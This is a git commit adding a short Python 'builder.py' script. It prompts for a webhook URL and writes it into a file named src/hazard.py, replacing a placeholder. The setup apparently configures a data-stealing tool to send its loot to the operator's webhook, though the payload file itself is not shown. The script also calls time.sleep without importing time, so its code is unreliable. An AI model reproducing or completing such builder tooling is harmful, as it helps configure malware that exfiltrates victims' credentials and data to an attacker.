f975ccf42008de4c564f4d685c2df3518c3878f2
yuvi <121696232+Yuvi5001@users.noreply.github.com>
2023-02-08 15:53:59 -0500

    Create builder.py

---
+++ builder.py
@@ -0,0 +1,22 @@
+webhook = input("What is your webhook? ")
+
+search_text = "whook"
+replace_text = webhook
+
+try:
+    with open(r'src/hazard.py', 'r') as file:
+  
+        data = file.read()
+  
+        data = data.replace(search_text, replace_text)
+  
+    with open(r'src/hazard.py', 'w') as file:
+  
+        file.write(data)
+    print("Successfully wrote your webhook to the src. Make sure again you entered a correct one!")
+    time.sleep(0.5)
+    print(f"This is the webhook you entered: {webhook}")
+except:
+    print("Failed to write your webhook to the src. Make sure the code is correct and has not been changed.")
+    time.sleep(0.5)
+    print(f"This is the webhook you entered: {webhook}")
